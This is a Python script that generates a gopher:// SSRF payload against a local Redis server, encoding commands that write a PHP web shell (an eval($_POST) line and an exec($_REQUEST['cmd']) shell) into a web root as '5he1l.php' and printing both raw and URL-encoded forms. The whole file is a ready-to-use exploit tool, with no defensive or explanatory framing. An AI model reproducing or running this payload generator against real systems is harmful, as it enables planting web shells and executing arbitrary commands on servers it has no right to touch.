# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20210413
import urllib.parse

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
shell = "\n\n<?php eval($_POST[\"test\"]);?>\n\n"
filename = "5he1l.php"
path = "/var/www/html"
passwd = "666"

path = "E:\\software\\phpstudy\\WWW"
shell = '''\n\n<?php $s=$_REQUEST['cmd'];exec($s, $r, $status);print_r($r);define('BASE_PATH',realpath(dirname(__FILE__).'/'));echo BASE_PATH;?>\n\n'''

cmd = ["select 5",
       "set 1 {}".format(shell.replace(" ", "${blank}")),
       "config set dir {}".format(path),
       "config set dbfilename {}".format(filename),
       "save",
       "quit"
       ]
if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))
payload = protocol + ip + ":" + port + "/_"


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${blank}", " ")))) + CRLF + x.replace("${blank}", " ")
    cmd += CRLF
    return cmd


if __name__ == "__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))

    # gopher payload:
    print(payload)
    # ssrf url payload:
    print(urllib.parse.quote(payload))
